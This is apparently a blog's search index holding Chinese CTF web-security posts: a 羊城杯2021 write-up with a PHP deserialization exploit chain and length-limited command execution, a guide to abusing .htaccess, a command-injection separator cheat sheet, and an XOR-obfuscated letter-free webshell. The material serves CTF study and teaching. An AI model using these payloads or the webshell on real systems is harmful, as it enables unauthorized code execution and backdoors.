<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>羊城杯2021</title>
      <link href="/2021/09/12/yang-cheng-bei-2021/"/>
      <url>/2021/09/12/yang-cheng-bei-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="羊城杯2021"><a href="#羊城杯2021" class="headerlink" title="羊城杯2021"></a>羊城杯2021</h1><h2 id="一·web"><a href="#一·web" class="headerlink" title="一·web"></a>一·web</h2><ol><li><h4 id="only4"><a href="#only4" class="headerlink" title="only4"></a>only4</h4><p>访问index.php，得到源码</p><p><img src="https://i.loli.net/2021/09/12/zQrHf28A7mFS3hL.png"></p><p>dirsearch扫了一波，没有结果，审计一下源码，发现gwht被过滤了flag和secret，说明secret.php应该是读取flag的关键。</p><p>再看后面的源码</p><pre class="line-numbers language-none"><code class="language-none">include($gwht); if (isset($ycb)){  $url = parse_ur1 ($_SERVER["REQUEST_URI"]);  parse_str ($url['query'], $query);  foreach ($query as $value) {    if (preg_match("/Flag/i", $value))      die('not hit');  }  $YCB= unserialize ($ycb);         //ycb被反序列化了，说明应该有一个php是关于ycb序列化的}else{  echo "what are you doing";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里一个第一个卡住的点就是dirsearch-master扫描不出来serialize.php，只能根据反序列化那里猜测是serialize.php。</p><p>再看后面这一段</p><pre class="line-numbers language-none"><code class="language-none">if (isset($ycb)){  $url = parse_ur1 ($_SERVER["REQUEST_URI"]);  parse_str ($url['query'], $query);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里事实上就是对parse_url()的绕过，参考————</p><p><a href="https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/">**一叶飘零师傅的博客</a>**</p><p>可见<code>parse_url</code>函数在解析url时存在的bug，///可使其返回false，从而绕过后面的过滤</p><p>所以这里我们也可以以相同的姿势绕过其对flag的过滤</p><p>这里我们先通过php伪协议可读取serialize.php的源码</p><p>?gwht=php://filter/read=convert.base64-encode/resource=serialize.php</p><p>base64解密后得到 </p><pre class="line-numbers language-none"><code class="language-none">class start_gg{public $mod1;public $mod2;public function __destruct(){$this-&gt;mod1-&gt;test1();}}class Call{public $mod1;public $mod2;public function test1(){$this-&gt;mod1-&gt;test2();}}class funct{public $mod1;public $mod2;public function __call($test2,$arr){$s1 = $this-&gt;mod1;$s1();}}class func{public $mod1;public $mod2;public function __invoke(){$this-&gt;mod2 = "?-???|??2?????￥".$this-&gt;mod1;}}class string1{public $str1;public $str2;public function __toString(){$this-&gt;str1-&gt;get_flag();return "1";}}class GetFlag{public function get_flag(){echo highlight_file('secret.php');}}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码很长 ，慢慢 分析</p><ul><li>要想获得输出flag，那么我们肯定要想办法调用GetFlag类的里的get_flag()方法。</li><li>在string1类我们可以看到，只要把$str1实例化为GetFlag类的对象，然后调用想办法调用__toString()方法即可，那就找有没有地方把对象当作字符串了。__</li><li>往上看，func类的__invoke()方法中有用.来进行字符串拼接的代码，那么只要把$mod1实例化为string类的对象，然后再调用该__invoke()方法即可，那就找有没有地方把对象当作函数来调用了。</li><li>发现在funct类的__call()中有$s1();可以利用，只需要把$mod1实例化为func类的对象，然后再调用该__call()方法，那就找哪里调用了未声明的函数。</li><li>再Call类中的test1()方法调用了不存在的test2()方法，所以只需要把$mod1实例化为funct类的对象，然后再调用该test1()方法。</li><li>看到在start_gg类中的__destruct()方法中正好调用了test1()方法，那么只要$mod1实例化为Call类的对象即可。<br>想要调用start_gg类中的__</li><li>destruct()方法，只有实例化一个它的对象即可，这个对象在销毁时会自动调用__destruct()函数。</li><li>如何在每个类中实例化另一个类呢？可以利用类的构造函数，只要这个类被实例化，构造函数就自动实例化了你所需要的那个类。</li></ul><p>思路了清楚了，exp如下</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php class start_gg {         public $mod1;         public function __construct()         {             $this-&gt;mod1 = new Call();         } } class Call {         public $mod1;         public function __construct()         {             $this-&gt;mod1 = new funct();         } } class funct {         public $mod1;         public function __construct()         {             $this-&gt;mod1 = new func();         } } class func {         public $mod1;         public function __construct()         {             $this-&gt;mod1 = new string1();         } } class string1 {         public $str1;         public function __construct()         {             $this-&gt;str1 = new GetFlag();         } } class GetFlag {} $a = new start_gg(); echo serialize($a); ?&gt; 得到序列化字符串 O:8:"start_gg":1:{s:4:"mod1";O:4:"Call":1:{s:4:"mod1";O:5:"funct":1:{s:4:"mod1";O:4:"func":1:{s:4:"mod1";O:7:"string1":1:{s:4:"str1";O:7:"GetFlag":0:{}}}}}}&lt;?php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后构造payload：</p><pre class="line-numbers language-none"><code class="language-none">http://xxx///index.php?gwht=serialize.php&amp;ycb=O:8:%22start_gg%22:1:{s:4:%22mod1%22;O:4:%22Call%22:1:{s:4:%22mod1%22;O:5:%22funct%22:1:{s:4:%22mod1%22;O:4:%22func%22:1:{s:4:%22mod1%22;O:7:%22string1%22:1:{s:4:%22str1%22;O:7:%22GetFlag%22:0:{}}}}}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到secret.php的源码</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);if(strlen($_GET['SXF'])&lt;5){  echo shell_exec($_GET['SXF']);}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据代码是通过GET方式传入SXF,如果字符串长度小于5，就通过shell_exec执行并打印</p><p>网上大多数四个字符getshell采取的是反弹shell的方式，但是由于这道题没有给沙盒的环境也没有reset，导致写错了就得重置，所以还是比较麻烦的</p><p>这里我主要运用了两个字符</p><pre class="line-numbers language-none"><code class="language-none">&gt; 重定向输出符  //在这里的作用是写入一个文件* 通配符    //这里的作用是省略字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>首先通过url传入&gt;cat，在目标目录下写入cat文件，ls查看后得到</p><p><img src="https://i.loli.net/2021/09/12/RaUP4OSqfwYmIbg.png"></p><p>再使用通配符进行执行，读取根目录下的flag文件</p><p><a href="http://xxxx/secret.php?SXF=c">http://xxxx/secret.php?SXF=c</a>*  /*                        得到flag</p><p>事实上这里其实* /*即可</p><p>这里稍微扩展一下限制长度下的命令执行</p><h6 id="一些-tricks"><a href="#一些-tricks" class="headerlink" title="一些 tricks"></a>一些 tricks</h6><ul><li><p>Linux 下可以用 <code>\</code> 来拼接命令，实现命令续行，生成文件的话文件名要双写\，比如 <code>&gt;ls\\</code>。</p></li><li><p>注意不要用 <code>.</code> 作为文件名的开头，因为 Linux 下 <code>.</code> 会作为隐藏文件，直接用 <code>ls</code> 列不出来。</p></li><li><p>为了不按照默认顺序排序，可以用 <code>ls -t</code>，按照时间顺序，后执行的排前面，于是可以拆分命令再拼接来实现。(ps:<code>ls</code> 默认的排序是按照字母顺序来的，一个一个字符来看，<code>|</code> =&gt; 空格 =&gt; 数字 =&gt; 字母。以 <code>-</code> 开头的文件名不看 <code>-</code>，从之后的第一个字符开始比较。)</p></li><li><p><code>dir a b&gt;c</code> 只会将 a b 写到文件 c 中，而其他的文件则不会。</p></li><li><p>用 <code>*</code> 可以得到当前目录下的所有目录及文件名，而且能用文件名执行命令。</p><p><img src="https://i.loli.net/2021/09/12/WepPw7UnskTcyHO.png"></p></li><li><p>利用 <code>rev</code> 命令可以执行反序，先生成一个名为 <code>rev</code> 的文件，再执行 <code>*v</code>，由于 Linux 的通配符，就相当于执行了 <code>rev v</code>，太妙了！</p></li><li><p>PHP 代码执行 <code>exec</code> 时，只需要输入<code>\</code> 即可生成 <code></code>，比如 <code>exec("&gt;ls\")</code> 即可，还能省一个字符呢。</p></li><li><p>反弹 shell 时候用的 IP 可以换成十进制不带小数点的。<em>（噢你有短域名啊，那 没事了）</em></p></li><li><p>可以依次执行 <code>&gt;env</code>, <code>*&gt;x</code>，相当于执行 <code>env&gt;x</code>，就能在 <code>x</code> 文件里得到环境变量里的内容</p></li></ul></li><li><h4 id="check-in-go"><a href="#check-in-go" class="headerlink" title="check_in go"></a>check_in go</h4></li><li></li><li></li><li></li></ol><h2 id="二·Misc"><a href="#二·Misc" class="headerlink" title="二·Misc"></a>二·Misc</h2><ol><li><h4 id="baby-forensic"><a href="#baby-forensic" class="headerlink" title="baby_forensic"></a>baby_forensic</h4><p>下载文件，得到一个.raw文件,raw原本是相机的数码原件，这里应该是指数据未加工</p><p>工具方面我们选择：volatility</p><p>先了解一下volatility的基本使用方法：</p><ul><li><p>```<br>volatility -f filename imageinfo   //这个命令可以用来获取内存镜像的摘要信息，比如系统版本，硬件构架等</p><pre class="line-numbers language-none"><code class="language-none">- ```  volatility -f filename kdbgscan    //这个插件可以扫描文件的profile的值，通常扫描结果有多个，只有一个结果是完全正确的，kdbgscan和imageinfo都只适用于windows的镜像<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>```<br>volatility -f filename –profile=Win7SPx64 pslist //pslist可以直接列出运行的进程，如果进程已经结束，会在Exit列显示日期和时间，表明进程已经结束</p><pre class="line-numbers language-none"><code class="language-none">- ```  volatility -f filename --profile=Win7SP1x64 hivelist  // 列举缓存在内存中的注册表（注册表是用于存储Windows系统用户，硬件和软件的存储配置信息的数据库。虽然注册表是为了配置系统而设计的，但它可以跟踪用户的活动，连接到系统的设备，什么时间什么软件被使用过等都将被记录在案。）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>```<br>volatility -f filename –profile=Win7SP1x64 filescan   //扫描内存中的文件<br>volatility -f filename –profile=Win7SP1x64 filescan |grep “doc|docx|rtf”  //filescan 也可以结合grep命令来进行筛选文件后缀<br>volatility -f filename –profile=Win7SP1x64 filescan |grep “flag”  //也可以查找字符串</p><pre class="line-numbers language-none"><code class="language-none">- ```  volatility -f filename --profile=Win7SP1x64 dumpfiles -Q 0x000000007f142f20 -D ./ -u //导出内存中缓存的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>```<br>volatility -f filename –profile=Win7SP1x64 cmdline  //提取内存中保留的cmd命令使用情况</p><pre class="line-numbers language-none"><code class="language-none">- ```  volatility -f filename --profile=Win7SP1x64 screenshot --dump-dir=./   //查看截图<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>```<br>volatility -f filename –profile=Win7SP1x64 netscan  //查看网络连接</p><pre class="line-numbers language-none"><code class="language-none">- ```  volatility -f wuliao.data --profile=Win7SP1x64 printkey -K "SAM\Domains\Account\Users\Names"  //查看系统用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><p>这道题我们先分析cmdline，发现了git,猜想与GitHub有关</p><p>接着filescan，发现存在ssh文件，更加印证了猜想</p><p>此时我们下载下来ssh文件，进行base64解码</p><p><img src="https://i.loli.net/2021/09/13/7XMY2mfnp9lrNo6.png"></p><p>得到一个邮箱，ssh-key，猜想GitHub可能有相关的信息</p><p>搜索得到</p><p><img src="https://i.loli.net/2021/09/13/6kYtmiSljKnG2u7.png"></p><p>下载__APP__文件，打开发现应该是一个微信小程序未编译的文件，微信小程序文件一般为.wxapkg，接下来要做的就是还原这个项目</p><p>需要用到工具wxappUnpacker</p><p>链接：<a href="https://pan.baidu.com/s/1VeWPr7LD7eWnN39vWDNPUQ">https://pan.baidu.com/s/1VeWPr7LD7eWnN39vWDNPUQ</a><br>提取码：0525</p><p>下载后先安装依赖的环境</p><pre class="line-numbers language-none"><code class="language-none">npm install esprima -gnpm install css-tree -gnpm install cssbeautify -gnpm install vm2 -gnpm install uglify-es -gnpm install js-beautify -gnpm install escodegen -g<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来使用wuWxapkg.js编译_app_文件，即可找到flag</p></li><li><h4 id="misc520"><a href="#misc520" class="headerlink" title="misc520"></a>misc520</h4></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>htaccess与userini</title>
      <link href="/2021/08/20/htaccess-yu-userini/"/>
      <url>/2021/08/20/htaccess-yu-userini/</url>
      
        <content type="html"><![CDATA[<h1 id="浅谈-htaccess与-user-ini"><a href="#浅谈-htaccess与-user-ini" class="headerlink" title="浅谈.htaccess与.user.ini"></a>浅谈.htaccess与.user.ini</h1><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><ol><li><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>.htaccess  文件是Apache中有一种特殊的文件，其提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一条或多条指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。</p><p>.htaccess 中有 <code>#</code> 单行注释符，且支持 <code>\</code> 拼接上下两行。</p></li><li><h4 id="作用范围"><a href="#作用范围" class="headerlink" title="作用范围"></a>作用范围</h4><p>.htaccess 文件中的配置指令作用于 .htaccess 文件所在的<strong>目录及其所有子目录</strong>，但是很重要的、需要注意的是，其上级目录也可能会有 .htaccess 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 .htaccess 文件中的指令可能会覆盖其上级目录中的  .htaccess 文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。</p></li><li><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p>启动 .htaccess，需要在服务器的主配置文件中将 AllowOverride 设置为 All，例如在 apache2.conf 中：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">AllowOverride  All    <span class="token comment"># 启动.htaccess文件的使用</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以通过 AccessFileName 将 .htaccess 修改为其他名：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">AccessFileName  <span class="token operator">.</span>config    <span class="token comment"># 将.htaccess修改为.config</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><h4 id="htaccess-常见指令"><a href="#htaccess-常见指令" class="headerlink" title=".htaccess 常见指令"></a>.htaccess 常见指令</h4><p>.htaccess 可以实现网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。这里我们主要讲解几种常利用的指令。详情请看官方文档：<a href="http://www.htaccess-guide.com/">http://www.htaccess-guide.com/</a> </p><h6 id="SetHandler"><a href="#SetHandler" class="headerlink" title="SetHandler"></a><strong>SetHandler</strong></h6><p><strong>SetHandler 指令可以强制所有匹配的文件被一个指定的处理器处理。</strong></p><ul><li><p>用法：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">SetHandler handler<span class="token operator">-</span><span class="token class-name">name</span><span class="token operator">|</span><span class="token class-name">None</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>示例 1：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时当前目录及其子目录下所有文件都会被当做 php 解析。</p></li><li><p>示例 2：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">SetHandler server<span class="token operator">-</span>status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启 Apache 的服务器状态信息（server-status 是 Apache 自带一个查看 Apache 状态的功能模块），可以查看所有访问本站的记录</p><p>访问任意不存在的文件，加参数 <code>?refresh=5</code> 来实现每隔 5s 自动刷新。</p></li></ul><h5 id="AddHandler"><a href="#AddHandler" class="headerlink" title="AddHandler"></a><strong>AddHandler</strong></h5><p><strong>AddHandler 指令可以实现在文件扩展名与特定的处理器之间建立映射。</strong></p><ul><li><p>用法：</p><pre class="line-numbers language-none"><code class="language-none">AddHandler handler-name extensive [extensive] ...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>示例：</p><pre class="line-numbers language-none"><code class="language-none">AddHandler cgi-script .xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即将扩展名为 .xxx 的文件作为 CGI 脚本来处理。</p></li></ul><h5 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a><strong>AddType</strong></h5><p><strong>AddType 指令可以将给定的文件扩展名映射到指定的内容类型。</strong></p><ul><li><p>用法：</p><pre class="line-numbers language-none"><code class="language-none">AddType media-type extensive [extensive] ...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>示例 1：</p><pre class="line-numbers language-none"><code class="language-none">AddType application/x-httpd-php .gif<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时将会把 gif 为后缀的文件当做 php 文件解析。</p></li><li><p>示例 2：</p><pre class="line-numbers language-none"><code class="language-none">AddType application/x-httpd-php png jpg gif<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时将会把 .png .jpg .gif 多个后缀的文件当做 php 解析。</p></li></ul><h5 id="php-value"><a href="#php-value" class="headerlink" title="php_value"></a><strong>php_value</strong></h5><p>当使用 PHP 作为 Apache 模块时，可以用 Apache 的配置文件（例如 httpd.conf）或 .htaccess  文件中的指令来修改 PHP 的配置设定。但是需要有开启 AllowOverride Options 或 AllowOverride All  权限才可以。</p><p><strong>php_value 指令用来设定指定的 PHP 的配置值。</strong>要清除先前设定的值，把 value 设为 none。但是 php_value 不能用来设定布尔值，如果要设定布尔值的话应该用 php_flag。</p><ul><li><p>用法：</p><pre class="line-numbers language-none"><code class="language-none">php_value name value<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是并不是所有的 PHP 配置都可以用 php_value 来设定，如下查看配置可被设定范围：</p><p>如上图可知 .htaccess 的 php_value 只能用于 PHP_INI_ALL 或 PHP_INI_PERDIR 类型的指令。</p></li><li><p>示例：</p><pre class="line-numbers language-none"><code class="language-none">php_value auto_prepend_file images.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置访问一个 PHP 文件时，在该文件解析之前会先自动包含并解析 images.png 文件。</p></li></ul><h5 id="php-flag"><a href="#php-flag" class="headerlink" title="php_flag"></a><strong>php_flag</strong></h5><p><strong>php_flag 指令用来设定布尔值类型的 PHP 配置选项。</strong></p><ul><li><p>用法：</p><pre class="line-numbers language-none"><code class="language-none">php_flag name on|off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一样的，php_flag 可以设定的配置也是有范围的，如下查看配置可被设定范围：</p></li><li><p>实例：</p><pre class="line-numbers language-none"><code class="language-none">php_flag engine 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 engine 设置为 0，即在本目录和子目录中关闭 PHP 解析，可以造成源码泄露。</p></li></ul></li></ol><h2 id="htaccess-的常见利用"><a href="#htaccess-的常见利用" class="headerlink" title=".htaccess 的常见利用"></a>.htaccess 的常见利用</h2><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>我们可以通过 .htaccess 文件的 php_flag 指令对 PHP 的 engine 配置选项进行设定，当把 engine 的值设为 off（或 0）时可以禁用一个本目录和子目录中的 PHP 解析，此时将会造成源码泄露：</p>]]></content>
      
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-RCE</title>
      <link href="/2021/08/10/ctf-rce/"/>
      <url>/2021/08/10/ctf-rce/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-RCE-远程代码执行"><a href="#CTF-RCE-远程代码执行" class="headerlink" title="CTF RCE(远程代码执行)"></a>CTF RCE(远程代码执行)</h1><h2 id="php代码执行"><a href="#php代码执行" class="headerlink" title="php代码执行"></a>php代码执行</h2><h3 id="一、相关函数"><a href="#一、相关函数" class="headerlink" title="一、相关函数"></a>一、相关函数</h3><h5 id="1、代码注入"><a href="#1、代码注入" class="headerlink" title="1、代码注入"></a>1、代码注入</h5><ul><li><p>eval()</p><p>传入的必须是有效的 PHP 代码。所有的语句必须以分号结尾。<br> return 语句会立即中止当前字符串的执行。</p><p>代码执行的作用域是调用 eval() 处的作用域。因此，eval() 里任何的变量定义、修改，都会在函数结束后被保留。</p></li><li><p>assert()</p></li><li><p>call_user_func()/call_user_func_array()</p><p>可以传递任何内置函数或用户自定义函数，除了语言结构如array(),echo(),empty(),eval(),exit(),isset(),list(),print(),unset()</p></li><li><p>create_function()</p></li><li><p>usort()/uasort()</p></li></ul><h5 id="2、命令执行"><a href="#2、命令执行" class="headerlink" title="2、命令执行"></a>2、命令执行</h5><ul><li>system()</li><li>exec()/shell_exec()</li><li>passthru</li><li>``运算符</li></ul><h2 id="二、命令执行的绕过"><a href="#二、命令执行的绕过" class="headerlink" title="二、命令执行的绕过"></a>二、命令执行的绕过</h2><h3 id="1、命令执行的分隔符"><a href="#1、命令执行的分隔符" class="headerlink" title="1、命令执行的分隔符"></a>1、命令执行的分隔符</h3><p>例子：<code>system("echo ".$_GET[1]);</code></p><table><thead><tr><th align="center">功能</th><th align="center">符号</th><th align="center">payload</th></tr></thead><tbody><tr><td align="center">换行符</td><td align="center">%0a</td><td align="center">?1=123%0apwd</td></tr><tr><td align="center">回车符</td><td align="center">%0d</td><td align="center">同上</td></tr><tr><td align="center">连续指令</td><td align="center">;</td><td align="center">?1=123;pwd</td></tr><tr><td align="center">后台进程</td><td align="center">&amp;</td><td align="center">?1=123&amp;pwd</td></tr><tr><td align="center">管道符</td><td align="center">|(显示后面语句的结果)</td><td align="center">?1=123|pwd</td></tr><tr><td align="center">逻辑运算</td><td align="center">||或&amp;&amp;</td><td align="center">?1=123||pwd</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单字符构造</title>
      <link href="/2021/08/04/jian-dan-zi-fu-gou-zao/"/>
      <url>/2021/08/04/jian-dan-zi-fu-gou-zao/</url>
      
        <content type="html"><![CDATA[<h1 id="浅析CTF绕过字符数字构造shell"><a href="#浅析CTF绕过字符数字构造shell" class="headerlink" title="浅析CTF绕过字符数字构造shell"></a><strong>浅析CTF绕过字符数字构造shell</strong></h1><h3 id="异或运算绕过"><a href="#异或运算绕过" class="headerlink" title="异或运算绕过"></a><strong>异或运算绕过</strong></h3><p>异或的符号是^,是一种运算符。</p><p>在 PHP 中两个字符串异或之后，得到的还是一个字符串。如果正则匹配过滤了字母和数字，那就可以使用两个不在正则匹配范围内的非字母非数字的字符进行异或，从而得到我们想要的字符串。</p><p>例如：</p><pre class="line-numbers language-none"><code class="language-none">1 ^ 1 = 01 ^ 0 = 10 ^ 1 = 10 ^ 0 = 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>基于此原理我们也可以构造出如下的无字母数字的 Webshell</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%01'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%13'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%13'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%05'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%12'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%14'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// $_='assert';</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0D'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%2F'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0E'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%09'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// $__='_POST';</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// assert($_POST[_]);</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到代码中的下划线 <code>_</code>、<code>__</code>、<code>___</code> 是一个变量，因为 preg_match() 过滤了所有的字母，我们只能用下划线来作变量名。最后拼接起来 Payload 如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%01'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%13'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%13'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%05'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%12'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%14'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0D'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%2F'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0E'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%09'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 密码为 "_"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>异或绕过脚本</strong></p><p> 单一字符绕过：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token 